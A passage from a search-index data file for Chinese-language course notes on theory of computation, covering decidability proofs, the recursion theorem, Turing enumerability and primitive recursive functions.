\\(\\emptyset\\in\\mathcal{L}(P)\\) \u6709 \\(\\emptyset\\notin\\overline{\\mathcal{L}(P)}\\)\uff0c\u6839\u636e case 1. \u53ef\u4ee5\u77e5\u9053 \\(\\overline{R(P)}\\) \u662f\u975e recursive \u7684\uff0c\u6240\u4ee5 \\(R(P)\\) \u4e5f\u662f\u975e recursive \u7684\u3002"},{"location":"cs/tcs/toc/topic4/#_10","title":"\u8bc1\u660e\u662f\u5426\u53ef\u5224\u5b9a\u7684\u65b9\u6cd5","text":"<ul> <li>\u8bc1\u660e\u53ef\u5224\u5b9a\uff08recursive\uff09\uff1a<ul> <li>\u901a\u8fc7\u5b9a\u4e49\u8bc1\u660e\uff0c\u5373\u6784\u5efa\u4e00\u4e2a\u56fe\u7075\u673a\u6765\u5224\u5b9a</li> <li>\u901a\u8fc7\u89c4\u7ea6\u8bc1\u660e\uff0c\u53ea\u9700\u8981\u8bc1\u660e\u5f53\u524d\u8bed\u8a00 \\(A\\leq\\) \u4e00\u4e2a\u5df2\u77e5\u7684 recursive \u8bed\u8a00</li> </ul> </li> <li>\u8bc1\u660e\u4e0d\u53ef\u5224\u5b9a\uff1a<ul> <li>\u901a\u8fc7\u5bf9\u89d2\u5316\uff08diagonalization\uff09\u7684\u6280\u5de7\u8bc1\u660e\uff0c\u5373\u8bc1\u660e \\(H\\) \u4e0d\u53ef\u5224\u5b9a\u7684\u65b9\u6cd5</li> <li>\u901a\u8fc7\u89c4\u7ea6\u8bc1\u660e\uff0c\u53ea\u9700\u8981\u8bc1\u660e\u4e00\u4e2a\u5df2\u77e5\u7684\u4e0d\u53ef\u5224\u5b9a\u7684\u8bed\u8a00 \\(\\leq\\) \u5f53\u524d\u8bed\u8a00 \\(A\\) \u5373\u53ef</li> </ul> </li> <li>\u8bc1\u660e\u53ef\u534a\u5224\u5b9a\uff08recursively enumerable\uff09\uff1a<ul> <li>\u901a\u8fc7\u5b9a\u4e49\u8bc1\u660e\uff0c\u5373\u6784\u5efa\u4e00\u4e2a\u56fe\u7075\u673a\u6765\u534a\u5224\u5b9a</li> <li>\u901a\u8fc7\u89c4\u7ea6\u8bc1\u660e\uff0c\u53ea\u9700\u8981\u8bc1\u660e\u5f53\u524d\u8bed\u8a00 \\(A\\leq\\) \u4e00\u4e2a\u5df2\u77e5\u7684 recursively enumerable \u8bed\u8a00 </li> </ul> </li> </ul> \u8bc1\u660e \\(A=\\{\\texttt{\"}M\\texttt{\"}: M\\text{ is a TM that halts on some input}\\}\\) \u662f recursively enumerable \u7684 <p>\u5c06\u6240\u6709\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u6309\u7167\u957f\u5ea6\u964d\u5e8f\u6392\u5217\u4e3a \\(s_1, s_2, \\cdots\\)\uff0cidea \u662f\u5bf9\u6bcf\u4e2a\u4e32\u540c\u65f6\u5e76\u884c\u8dd1\u56fe\u7075\u673a\uff0c\u76f4\u5230\u6709\u4e00\u4e2a\u8f93\u5165\u505c\u673a\uff0c\u8fd9\u5c31\u534a\u5224\u5b9a\u4e86\u3002\u4e0d\u8fc7\u56e0\u4e3a\u5b57\u7b26\u4e32\u53ef\u80fd\u662f\u65e0\u7a77\u591a\u7684\uff0c\u6240\u4ee5\u5f53\u7136\u6ca1\u529e\u6cd5\u5e76\u884c\u8dd1\u65e0\u7a77\u4e2a\u56fe\u7075\u673a\u3002\u89e3\u51b3\u65b9\u6848\u662f\u5c06\u4e8c\u7ef4\u65e0\u7a77\u7ed3\u6784\u4e00\u7ef4\u5316\uff0c\u5373\u5148\u5bf9 \\(s_1\\) \u8dd1\u4e00\u6b65\uff0c\u6ca1\u505c\u673a\u5c31\u5bf9 \\(s_1\\) \u548c \\(s_2\\) \u90fd\u8dd1\u4e24\u6b65\uff0c\u6ca1\u505c\u673a\u5c31\u5bf9 \\(s_1, s_2, s_3\\) \u90fd\u8dd1\u4e09\u6b65\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u4fdd\u8bc1\u6bcf\u4e2a\u4e32\u90fd\u4f1a\u88ab\u8dd1\u5230\uff0c\u5047\u8bbe\u5728 \\(s_j\\) \u7684\u7b2c \\(k\\) \u6b65\u505c\u673a\u7684\u8bdd\uff0c\u5219\u8dd1 \\(\\max(j, k)\\) \u6b65\u5373\u53ef\u3002 </p> <p>\u5373\u5b9a\u4e49\u56fe\u7075\u673a \\(M_A\\) = on input \\(\\texttt{\"}M\\texttt{\"}\\):</p> <ol> <li>for \\(i = 1, 2,\\cdots\\)</li> <li>\u2003\u2003for \\(s = s_1, s_2, \\cdots, s_i\\)</li> <li>\u2003\u2003\u2003\u2003run \\(M\\) on \\(s\\) for \\(i\\) steps</li> <li>\u2003\u2003\u2003\u2003if \\(M\\) halts on \\(s\\) within \\(i\\) steps</li> <li>\u2003\u2003\u2003\u2003\u2003\u2003halt</li> </ol> <ul> <li>\u8bc1\u660e\u4e0d\u53ef\u534a\u5224\u5b9a\uff1a<ul> <li>\u901a\u8fc7\u89c4\u7ea6\uff0c\u8bc1\u660e\u4e00\u4e2a\u5df2\u77e5\u7684\u975e recursively enumerable \u8bed\u8a00 \\(\\leq\\) \u5f53\u524d\u8bed\u8a00 \\(A\\)</li> <li>\u901a\u8fc7\u5982\u4e0b\u5b9a\u7406</li> </ul> </li> </ul> Theorem 3. \u5982\u679c \\(A\\) \u548c \\(\\overline{A}\\) \u90fd\u53ef\u534a\u5224\u5b9a\uff0c\u5219 \\(A\\) \u53ef\u5224\u5b9a <p>Proof. \u5047\u8bbe \\(M_1\\) \u548c \\(M_2\\) \u5206\u522b\u534a\u5224\u5b9a \\(A\\) \u548c \\(\\overline{A}\\)\uff0c\u5219\u6784\u9020\u56fe\u7075\u673a \\(M\\) = on input \\(x\\):</p> <ol> <li>run \\(M_1\\) and \\(M_2\\) on \\(x\\) in parallel</li> <li>if \\(M_1\\) halts</li> <li>\u2003\u2003accept \\(x\\)</li> <li>else // if \\(M_2\\) halts</li> <li>\u2003\u2003reject \\(x\\)</li> </ol> <p>\u56e0\u4e3a \\(A\\) \u548c \\(\\overline{A}\\) \u90fd\u53ef\u534a\u5224\u5b9a\uff0c\u6240\u4ee5\u5728\u4e00\u4e2a\u8f93\u5165\u4e0a \\(M_1\\) \u548c \\(M_2\\) \u6709\u4e14\u4ec5\u6709\u4e00\u4e2a\u4f1a\u505c\u673a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u6784\u9020 \\(M\\) \u6765\u5224\u5b9a \\(A\\)\u3002</p> <p>\u6240\u4ee5\u5982\u679c \\(H\\) \u662f recursively enumerable \u4f46\u53c8\u4e0d\u662f recursive \u7684\uff0c\u90a3\u4e48 \\(\\overline{H}\\) \u4e00\u5b9a\u662f\u975e recursively enumerable \u7684\u3002</p> <p>\u56e0\u6b64\u6211\u4eec\u4e5f\u77e5\u9053\uff1a</p> <ul> <li>recursive \u5728 \\(\\cup,\\ \\cap,\\ \\overline{\\phantom{A}},\\ \\circ,\\ ^*\\) \u4e0b\u90fd\u662f\u5c01\u95ed\u7684</li> <li>recursively enumerable \u5728 \\(\\cup,\\ \\cap,\\ \\circ,\\ ^*\\) \u4e0b\u662f\u5c01\u95ed\u7684\uff0c\u4f46 \\(\\overline{\\phantom{A}}\\) \u4e0b\u4e0d\u5c01\u95ed</li> </ul>"},{"location":"cs/tcs/toc/topic4/#_11","title":"\u81ea\u8f93\u51fa\u7a0b\u5e8f\u95ee\u9898","text":"<p>\u63a5\u4e0b\u6765\u770b\u4e00\u4e2a\u95ee\u9898\uff1a\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b83\u53ef\u4ee5\u8f93\u51fa\u81ea\u5df1\u7684\u4ee3\u7801\u3002\u5373\u56fe\u7075\u673a \\(M\\) \u4f1a\u5728\u5b83\u7684\u7eb8\u5e26\u4e0a\u5199\u4e0b \\(\\texttt{\"}M\\texttt{\"}\\)\u3002</p> <ul> <li>\u505a\u6cd5\u662f\u5c06 \\(M\\) \u5206\u6210 \\(A, B\\) \u4e24\u4e2a\u90e8\u5206<ul> <li>\\(A\\) \u4f1a\u5728\u7eb8\u5e26\u4e0a\u5199 \\(\\texttt{\"}B\\texttt{\"}\\)</li> <li>\\(B\\) \u4f1a\u5728\u7eb8\u5e26\u4e0a\u5199 \\(\\texttt{\"}A\\texttt{\"}\\) \u5e76\u4e14\u4ea4\u6362 \\(\\texttt{\"}A\\texttt{\"}\\texttt{\"}B\\texttt{\"}\\) \u7684\u4f4d\u7f6e</li> </ul> </li> <li>\u63a5\u4e0b\u6765\u8981\u89e3\u51b3 \\(B\\) \u6267\u884c\u65f6\u9700\u8981\u4f9d\u9760\u4e8e \\(A\\) \u7684\u7f16\u7801\u7684\u95ee\u9898<ul> <li>\u4ee4\u51fd\u6570 \\(q(w)=\\texttt{\"}M_w\\texttt{\"}\\)\uff0c\u5176\u4e2d \\(M_w\\) \u662f\u4e00\u4e2a\u56fe\u7075\u673a\uff0c\u5b83\u4f1a\u5728\u7eb8\u5e26\u4e0a\u5199\u4e0b \\(w\\)\uff0c\u7136\u540e\u505c\u673a<ul> <li>\u8fd9\u4e2a\u51fd\u6570 \\(q\\) \u662f\u53ef\u8ba1\u7b97\u7684\uff08computable\uff09\u7684\uff0c\u56e0\u4e3a\u53ef\u4ee5\u76f4\u63a5\u6784\u9020\u56fe\u7075\u673a \\(M_w\\) = on input \\(x\\):<ol> <li>write \\(x\\) on the tape</li> <li>halt</li> </ol> </li> <li>\u8fd9\u610f\u5473\u7740\u53ea\u8981\u6709\u4e00\u4e2a\u7a0b\u5e8f\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u8f93\u51fa\u5b83\u7684\u56fe\u7075\u673a</li> </ul> </li> <li>\u6240\u4ee5\u63a5\u4e0b\u6765\u6784\u9020\u56fe\u7075\u673a \\(B\\) = on input \\(w\\):<ol> <li>compute \\(q(w)\\)</li> <li>write \\(q(w)\\cdot w\\) on the tape</li> </ol> </li> <li>\u8fd9\u6837 \\(B\\) \u5df2\u7ecf\u786e\u5b9a\u4e14\u4e0d\u4f9d\u9760 \\(A\\) \u672c\u8eab\uff0c\\(A\\) \u53ef\u4ee5\u8f93\u51fa \\(B\\)\uff0c\u7136\u540e \\(B\\) \u6839\u636e \\(A\\) \u7684\u8f93\u51fa\u6784\u9020\u51fa\u5176\u56fe\u7075\u673a\uff0c\u518d\u8f93\u51fa\uff0c\u5c31\u4e0d\u5b58\u5728\u65e0\u9650\u9012\u5f52\u7684\u95ee\u9898\u4e86</li> </ul> </li> </ul> <p>\u8fd9\u4e2a\u7b97\u6cd5\u53ef\u4ee5\u5f15\u51fa\u4e00\u4e2a\u5b9a\u7406\uff1a</p> Recursion Theorem <p>\u7ed9\u5b9a\u4efb\u610f\u56fe\u7075\u673a \\(T\\)\uff0c\u90fd\u80fd\u627e\u5230\u56fe\u7075\u673a \\(R\\) \u4f7f\u5f97\u5bf9\u4e8e\u4efb\u610f\u5b57\u7b26\u4e32 \\(w\\)\uff0c\u5728 \\(R\\) \u4e0a\u8ba1\u7b97 \\(w\\) \u7b49\u4ef7\u4e8e\u5728 \\(T\\) \u4e0a\u8ba1\u7b97 \\(\\texttt{\"}R\\texttt{\"}w\\)\u3002</p> Proof <p>\u6784\u9020 \\(R\\) \u4e3a\u4e09\u6bb5\u7a0b\u5e8f \\(A, B, T\\) \u7684\u62fc\u63a5\uff0c\u5728\u8f93\u5165 \\(w\\) \u65f6\uff1a</p> <ul> <li>\\(A\\) \u5728\u7eb8\u5e26\u4e0a\u8f93\u51fa \\(\\texttt{\"}B\\texttt{\"}\\texttt{\"}T\\texttt{\"}\\)<ul> <li>\u8fd9\u4e4b\u540e\u7684\u7eb8\u5e26\u4e3a \\(w\\texttt{\"}B\\texttt{\"}\\texttt{\"}T\\texttt{\"}\\)\uff0c\u5176\u4e2d \\(w\\) \u662f\u8f93\u5165</li> </ul> </li> <li>\\(B\\) \u5728\u7eb8\u5e26\u4e0a\u8f93\u51fa \\(\\texttt{\"}A\\texttt{\"}\\)\uff0c\u7136\u540e\u91cd\u6392\u7eb8\u5e26\u4e0a\u7684\u51e0\u4e2a\u90e8\u5206\u4e3a \\(\\texttt{\"}A\\texttt{\"}\\texttt{\"}B\\texttt{\"}\\texttt{\"}T\\texttt{\"}w\\)\uff0c\u5373 \\(\\texttt{\"}R\\texttt{\"}w\\)</li> <li>\\(T\\) \u5373\u7ed9\u5b9a\u7684\u4efb\u610f\u56fe\u7075\u673a<ul> <li>\u6b64\u65f6\u8fd0\u884c \\(T\\) \u7684\u8f93\u5165\u5c31\u662f \\(\\texttt{\"}R\\texttt{\"}w\\)</li> </ul> </li> </ul> <p>\u8fd9\u610f\u5473\u7740\u4e00\u4e2a\u56fe\u7075\u673a\u53ef\u4ee5\u5728\u8fd0\u884c\u7684\u65f6\u5019\u53ef\u4ee5\u5f97\u5230\u81ea\u8eab\u7684\u7f16\u7801\uff0c\u5373\u5982\u4e0b\u56fe\u7075\u673a\u662f\u5408\u6cd5\u7684\uff0c\\(M\\) = on input \\(x\\):</p> <ol> <li>obtain \\(\\texttt{\"}M\\texttt{\"}\\)</li> <li>...</li> </ol> \u5229\u7528 Recursion Theorem \u8bc1\u660e\u505c\u673a\u95ee\u9898\u4e0d\u53ef\u5224\u5b9a <p>\u5047\u8bbe \\(H\\) \u662f\u53ef\u5224\u5b9a\u7684\uff0c\u5219\u5b58\u5728 \\(M_H\\) \u5224\u5b9a \\(H\\)\u3002\u63a5\u4e0b\u6765\u6784\u9020\u56fe\u7075\u673a \\(R\\) = on input \\(w\\):</p> <ol> <li>obtain \\(\\texttt{\"}R\\texttt{\"}\\)</li> <li>run \\(M_H\\) on \\(\\texttt{\"}R\\texttt{\"}w\\)</li> <li>if \\(M_H\\) accepts \\(\\texttt{\"}R\\texttt{\"}w\\)</li> <li>\u2003\u2003looping forever</li> <li>else // \\(M_H\\) rejects \\(\\texttt{\"}R\\texttt{\"}w\\)</li> <li>\u2003\u2003halt</li> </ol> <p>\u610f\u601d\u5c31\u662f\u5982\u679c\u7b2c\u4e09\u884c\u6210\u7acb\uff0c\u90a3\u4e48\u5c31\u8bf4\u660e \\(M_H\\) \u8ba4\u4e3a \\(R\\) \u5728 \\(w\\) \u4e0a\u505c\u673a\uff0c\u6240\u4ee5\u63a5\u4e0b\u6765\u4f1a\u8fdb\u5165\u7b2c\u56db\u884c\u6b7b\u5faa\u73af\uff0c\u5bfc\u81f4 \\(R\\) \u5728 \\(w\\) \u4e0a\u5e76\u6ca1\u6709\u505c\u673a\u3002\u5426\u5219\u7b2c\u4e94\u884c\u6210\u7acb\uff0c\u8bf4\u660e \\(M_H\\) \u8ba4\u4e3a \\(R\\) \u5728 \\(w\\) \u4e0a\u4e0d\u505c\u673a\uff0c\u4f46\u63a5\u4e0b\u6765\u7b2c\u516d\u884c\u53c8\u4f1a\u505c\u673a\u3002\u4ea7\u751f\u4e86\u77db\u76fe\uff0c\u6240\u4ee5\u5047\u8bbe\u5e76\u4e0d\u6210\u7acb\u3002</p>"},{"location":"cs/tcs/toc/topic4/#_12","title":"\u56fe\u7075\u673a\u679a\u4e3e\u5b57\u7b26\u4e32","text":"<p>\u63a5\u4e0b\u6765\u7ed9\u56fe\u7075\u673a\u518d\u6269\u5145\u4e24\u4e2a\u529f\u80fd\uff1a</p> <ul> <li>\u5bf9\u4e8e\u67d0\u4e9b\u72b6\u6001 \\(q\\)\uff0c\u4ee4 \\(L=\\{w:(s, \\rhd\\underline{\u2334})\\vdash_M^*(q, \\rhd\\underline{\u2334}w)\\}\\)<ul> <li>\u5373\u4ece\u7a7a\u7684\u5f00\u59cb\u72b6\u6001\u6267\u884c\uff0c\u6536\u96c6\u5230 \\(q\\) \u65f6\u7eb8\u5e26\u4e0a\u51fa\u73b0\u7684\u5b57\u7b26\u4e32\u7684\u96c6\u5408\u6784\u6210\u8bed\u8a00 \\(L\\)</li> </ul> </li> <li>\u5219\u79f0\u8bed\u8a00 \\(L\\) \u662f\u56fe\u7075\u53ef\u679a\u4e3e\u7684\uff08Turing enumerable\uff09</li> <li>\u79f0 \\(M\\) enumerates \\(L\\)</li> </ul> Theorem 4. \u8bed\u8a00 \\(L\\) \u662f\u56fe\u7075\u53ef\u679a\u4e3e\u7684\u5f53\u4e14\u4ec5\u5f53\u5b83\u662f\u9012\u5f52\u53ef\u679a\u4e3e\u7684\uff08recursively enumerable\uff09 <p>Proof. \u5982\u679c \\(L\\) \u662f\u6709\u9650\u7684\u5219\u663e\u7136\u6210\u7acb\uff0c\u4e0b\u9762\u8003\u8651 \\(L\\) \u662f\u65e0\u9650\u7684\u60c5\u51b5\u3002</p> <ul> <li>\u5de6\u63a8\u53f3\uff0c\u5982\u679c \\(L\\) \u56fe\u7075\u53ef\u679a\u4e3e\uff0c\u5219\u5b58\u5728 \\(M\\) enumerates \\(L\\)\uff0c\u76ee\u6807\u5219\u662f\u6784\u9020 \\(M'\\) \u534a\u5224\u5b9a \\(L\\)<ul> <li>\u6784\u9020\u56fe\u7075\u673a \\(M'\\) = on input \\(x\\):<ol> <li>run \\(M\\) to enumerate \\(L\\)</li> <li>for every string \\(s\\) enumerated by \\(M\\)</li> <li>\u2003\u2003if \\(s=x\\)</li> <li>\u2003\u2003\u2003\u2003halt</li> </ol> </li> </ul> </li> <li>\u53f3\u63a8\u5de6\uff0c\u5982\u679c \\(L\\) \u9012\u5f52\u53ef\u679a\u4e3e\uff0c\u5219\u5b58\u5728 \\(M\\) \u534a\u5224\u5b9a \\(L\\)\uff0c\u76ee\u6807\u5219\u662f\u6784\u9020 \\(M'\\) enumerates \\(L\\)<ul> <li>\u6784\u9020\u65b9\u6cd5\u7c7b\u4f3c\u524d\u9762\u8bc1\u660e \\(A=\\{\\texttt{\"}M\\texttt{\"}: M\\text{ is a TM that halts on some input}\\}\\) \u53ef\u534a\u5224\u5b9a\u7684\u4f8b\u5b50</li> </ul> </li> </ul> <ul> <li>\u4ee4 \\(M\\) \u662f\u53ef\u4ee5\u5224\u5b9a \\(L\\) \u7684\u56fe\u7075\u673a</li> <li>\u5982\u679c\u53ea\u8981 \\((q, \\rhd\\underline{\u2334}w_1)\\vdash_M^+(q, \\rhd\\underline{\u2334}w_2)\\)\uff0c\u5c31\u6709 \\(w_2\\) \u5728 \\(w_1\\) \u7684\u5b57\u5178\u5e8f\uff08lexicographical order\uff09\u540e</li> <li>\u5219\u79f0 \\(M\\) lexicographically enumerates \\(L\\)\uff0c\u79f0 \\(L\\) \u662f\u5b57\u5178\u5e8f\u53ef\u679a\u4e3e\u7684\uff08lexicographically enumerable\uff09</li> </ul> Theorem 5. \u8bed\u8a00 \\(L\\) \u662f\u5b57\u5178\u5e8f\u53ef\u679a\u4e3e\u7684\u5f53\u4e14\u4ec5\u5f53\u5b83\u662f\u53ef\u5224\u5b9a\u7684 <p>\u8bc1\u660e\u65b9\u5f0f\u7c7b\u4f3c Theorem 4.</p>"},{"location":"cs/tcs/toc/topic5/","title":"\u51fd\u6570\u53ef\u8ba1\u7b97\u6027","text":"<p> \u7ea6 2388 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>Abstract</p> <p>\u7406\u8bba\u8ba1\u7b97\u673a\u79d1\u5b66\u5bfc\u5f15\u7b2c\u5341\u4e8c\u81f3\u7b2c\u5341\u4e09\u5468\u8bfe\u7a0b\u5185\u5bb9</p> <p>\u4ece\u51fd\u6570\u7684\u89d2\u5ea6\u6765\u770b\u56fe\u7075\u673a\u7684\u5224\u5b9a\u6027\u3002\u8003\u8651\u6570\u503c\u51fd\u6570 \\(f\\colon\\mathbb{N}^k\\to\\mathbb{N}\\)\uff0c\u56fe\u7075\u673a \\(M\\) computes \\(f\\) if for any \\(n_1, \\cdots, n_k\\in\\mathbb{N}\\):</p> \\[ M(\\mathrm{bin}(n_1), \\cdots, \\mathrm{bin}(n_k)) = \\mathrm{bin}(f(n_1, \\cdots, n_k)) \\]"},{"location":"cs/tcs/toc/topic5/#_2","title":"\u539f\u59cb\u9012\u5f52\u51fd\u6570","text":"<ul> <li>basic functions<ul> <li>zero function: \\(\\mathrm{zero}(n_1, n_2, \\cdots, n_k) = 0\\)</li> <li>identity function: \\(\\mathrm{id}_{kj}(n_1, n_2, \\cdots, n_k) = n_j\\)</li> <li>successor function: \\(\\mathrm{succ}(n) = n+1\\)</li> </ul> </li> <li>basic functions \u90fd\u662f\u53ef\u8ba1\u7b97\u7684</li> <li>\u4e24\u79cd\u64cd\u4f5c\uff1a<ul> <li>composition: <ul> <li>\\(g\\colon\\mathbb{N}^k\\to\\mathbb{N}\\), \\(h_1, \\cdots, h_k\\colon\\mathbb{N}^l\\to\\mathbb{N}\\)</li> <li>=&gt; \\(f(n_1, \\cdots, n_l) = g(h_1(n_1, \\cdots, n_l), \\cdots, h_k(n_1, \\cdots, n_l))\\)</li> </ul> </li> <li>recursive definition:<ul> <li>\\(g\\colon\\mathbb{N}^{k}\\to\\mathbb{N}\\), \\(h\\colon\\mathbb{N}^{k+2}\\to\\mathbb{N}\\)</li> <li>\\(f\\colon\\mathbb{N}^{k+1}\\to\\mathbb{N}\\), \\(\\begin{cases}f(n_1, \\cdots, n_k, 0) = g(n_1, \\cdots, n_k) \\\\ f(n_1, \\cdots, n_k, m+1) = h(n_1, \\cdots, n_k, m, f(n_1, \\cdots, n_k, m))\\end{cases}\\)</li> </ul> </li> </ul> </li> <li>\u5b9a\u4e49\uff1a\u7531 basic functions \u548c\u4e24\u79cd\u64cd\u4f5c\u7ec4\u5408\u800c\u6210\u7684\u51fd\u6570\u4e3a primitive recursive functions<ul> <li>\u63a8\u8bba\uff1a\u539f\u59cb\u9012\u5f52\u51fd\u6570\u901a\u8fc7\u4e24\u79cd\u64cd\u4f5c\u7ec4\u5408\u5f62\u6210\u7684\u51fd\u6570\u4ecd\u4e3a\u539f\u59cb\u9012\u5f52\u51fd\u6570</li> </ul> </li> </ul> \u539f\u59cb\u9012\u5f52\u51fd\u6570\u7684\u4f8b\u5b50 \\(\\mathrm{plus2}(n) = n+2\\) \\(= \\mathrm{succ}(\\mathrm{succ}(n))\\) \\(\\mathrm{plus}(m, n) = m + n\\) \\(\\begin{cases}\\mathrm{plus}(m, 0) = m \\\\ \\mathrm{plus}(m, n+1) = \\mathrm{succ}(\\mathrm{plus}(m, n)) = \\mathrm{succ}(\\mathrm{id}_{3,3}(m, n, \\mathrm{plus}(m, n)))\\end{cases}\\) \\(\\mathrm{mult}(m, n) = m \\times n\\) \\(\\begin{cases}\\mathrm{mult}(m, 0) = 0 \\\\ \\mathrm{mult}(m, n+1) = \\mathrm{plus}(m, \\mathrm{mult}(m, n))\\end{cases}\\) \\(\\mathrm{exp}(m, n) = m^n\\) \\(\\begin{cases}\\mathrm{exp}(m, 0) = 1 \\\\ \\mathrm{exp}(m, n+1) = \\mathrm{mult}(m, \\mathrm{exp}(m, n))\\end{cases}\\) \\(f(n_1, \\cdots, n_k) = C\\) \u5e38\u6570\u51fd\u6570 \\(\\underbrace{\\mathrm{succ}(\\cdots(\\mathrm{succ}}_{C\\text{ times}}(\\mathrm{zero}(n_1, \\cdots, n_k))\\cdots))\\) \\(\\mathrm{sgn}(n) = \\begin{cases}0 &amp; n = 0 \\\\ 1 &amp; n &gt; 0\\end{cases}\\) \\(\\begin{cases}\\mathrm{sgn}(0) = 0 \\\\ \\mathrm{sgn}(n+1) = 1\\end{cases}\\) \\(\\mathrm{pred}(n) = \\begin{cases}0 &amp; n = 0 \\\\ n-1 &amp; n &gt; 0\\end{cases}\\) \\(\\begin{cases}\\mathrm{pred}(0) = 0 \\\\ \\mathrm{pred}(n+1) = n = \\mathrm{id}_{2,1}(n, \\mathrm{pred}(n))\\end{cases}\\) \\(m\\sim n = \\max\\{m-n, 0\\}\\) \\(\\begin{cases}m\\sim 0 = m \\\\ m\\sim (n+1) = \\mathrm{pred}(m\\sim n)\\end{cases}\\) <ul> <li>\u5982\u679c \\(f, g\\) \u5747\u4e3a\u539f\u59cb\u9012\u5f52\u51fd\u6570\uff0c\u5219 \\(f+g, f - g, f\\cdot g\\) \u5747\u4e3a\u539f\u59cb\u9012\u5f52\u51fd\u6570</li> <li>\u51fd\u6570\u503c\u53ea\u6709 0 1 \u7684\u51fd\u6570 =&gt; predicates</li> <li>\u5982\u679c\u4e24\u4e2a predicates \\(p, q\\) \u90fd\u662f\u539f\u59cb\u9012\u5f52\u51fd\u6570\uff0c\u5219 \\(p\\land q, p\\lor q, \\lnot p\\) \u5747\u4e3a\u539f\u59cb\u9012\u5f52\u51fd\u6570<ul> <li>\\(\\lnot p = 1 - p, p\\land q = p\\cdot q, p\\lor q = \\mathrm{positive}(p+q)\\)</li> </ul> </li> </ul> predicates \u4f8b\u5b50 <p>\\(\\mathrm{positive}(n) = \\mathrm{sgn}(n)\\)</p> <p>\\(\\mathrm{iszero}(n) = 1 - \\mathrm{sgn}(n)\\)</p> <p>\\(\\mathrm{geq}(m, n) = \\mathrm{iszero}(n\\sim m)\\)</p> <p>\\(\\mathrm{eq}(m, n) = \\mathrm{geq}(m, n)\\land\\mathrm{geq}(n, m)\\)</p> <ul> <li>\u6761\u4ef6\u51fd\u6570 \\(f(n_1, \\cdots, n_k) = \\begin{cases}g(n_1, \\cdots, n_k) &amp; \\text{if }p(n_1, \\cdots, n_k)\\\\ h(n_1, \\cdots, n_k) &amp; \\text{otherwise}\\end{cases}\\)<ul> <li>\u5982\u679c \\(g, h, p\\) \u90fd\u662f\u539f\u59cb\u9012\u5f52\u51fd\u6570\uff0c\u5219 \\(f\\) \u4e5f\u662f</li> <li>\\(f=p\\cdot g + (1\\sim p)\\cdot h\\)</li> </ul> </li> </ul> \u5176\u4ed6\u590d\u6742\u539f\u59cb\u9012\u5f52\u51fd\u6570\u4f8b\u5b50 \\(\\mathrm{rem}(m, n) = m \\% n\\) <p>\\(\\begin{cases}\\mathrm{rem}(0, n) = 0 \\\\ \\mathrm{rem}(m+1, n) = \\begin{cases}0 &amp; \\text{if }m+1\\text{ is divisible by }n\\\\ \\mathrm{rem}(m, n) + 1 &amp; \\text{otherwise}\\end{cases}\\end{cases}\\)</p> <p>\u5176\u4e2d \\(m+1\\) \u88ab \\(n\\) \u6574\u9664\u5f53\u4e14\u4ec5\u5f53 \\(\\mathrm{eq}(\\mathrm{rem}(m, n), \\mathrm{pred}(n))\\)</p> \\(\\mathrm{div}(m, n) = \\lfloor m/n\\rfloor\\)\uff08\u5047\u5b9a \\(n\\neq 0\\)\uff09 \\(\\begin{cases}\\mathrm{div}(0, n) = 0 \\\\ \\mathrm{div}(m+1, n) = \\begin{cases}\\mathrm{div}(m, n) + 1 &amp; \\text{if }m+1\\text{ is divisible by }n\\\\ \\mathrm{div}(m, n) &amp; \\text{otherwise}\\end{cases}\\end{cases}\\) \\(\\mathrm{digit}(m, n, p) = a_{m-1}\\)\uff0c\u5176\u4e2d \\(n = \\cdots+a_{m-1}p^{m-1}+\\cdots+a_1p+a_0\\)\uff08\u5373\u5c06 \\(n\\) \u7528 \\(p\\) \u8fdb\u5236\u8868\u793a\u5e76\u53d6\u7b2c \\(m\\) \u4f4d\uff09 \\(\\mathrm{digit}(m, n, p) = \\mathrm{div}(\\mathrm{rem}(n, p^m), p^{m-1})\\) \\(\\mathrm{sum}_f(m, n) = \\sum_{k = 0}^n f(m, k)\\) \\(\\begin{cases}\\mathrm{sum}_f(m, 0) = f(m, 0) \\\\ \\mathrm{sum}_f(m, n+1) = \\mathrm{sum}_f(m, n) + f(m, \\mathrm{succ}(n))\\end{cases}\\) <p>\\(\\mathrm{mult}_f(m, n) = \\prod_{k = 0}^n f(m, k)\\) \u540c\u7406</p> \u7ed9\u5b9a\u4e00\u4e2a primitive recursive predicates \\(p\\)\uff0c\u5b9a\u4e49 \\(g_p(n)\\)\uff08bounded disjunction\uff09\u4e3a\u5728 \\([0, n]\\) \u4e2d\u662f\u5426\u5b58\u5728\u503c\u4f7f \\(p\\) \u4e3a\u771f\uff0c\u5b9a\u4e49 \\(h_p(n)\\)\uff08bounded conjunction\uff09\u4e3a\u5728 \\([0, n]\\) \u4e2d\u7684\u4efb\u610f\u503c\u662f\u5426\u90fd\u4f7f\u5f97 \\(p\\) \u4e3a\u771f <p>\\(g_p(n) = \\mathrm{positive}(\\sum_{k=0}^n p(k)) = \\mathrm{positive}(\\mathrm{sum}_p(n))\\)\uff08\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e22\u6389\u4e86\uff09</p> <p>\\(h_p(n) = \\prod_{k=0}^n p(k) = \\mathrm{mult}_p(n)\\)</p> Lemma. \u539f\u59cb\u9012\u5f52\u51fd\u6570\u90fd\u662f\u53ef\u8ba1\u7b97\u7684 <p>Proof. basic functions \u90fd\u662f\u53ef\u8ba1\u7b97\u7684\uff0c\u4e14 composition \u548c recursive definition \u4f1a\u4fdd\u7559\u53ef\u8ba1\u7b97\u6027\uff0c\u6240\u4ee5\u7ec4\u5408\u800c\u6210\u7684\u6240\u6709\u539f\u59cb\u9012\u5f52\u51fd\u6570\u90fd\u662f\u53ef\u8ba1\u7b97\u7684\u3002</p> \u53cd\u4e4b\uff0c\u6240\u6709\u53ef\u8ba1\u7b97\u7684\u51fd\u6570\u4e0d\u90fd\u662f\u539f\u59cb\u9012\u5f52\u51fd\u6570 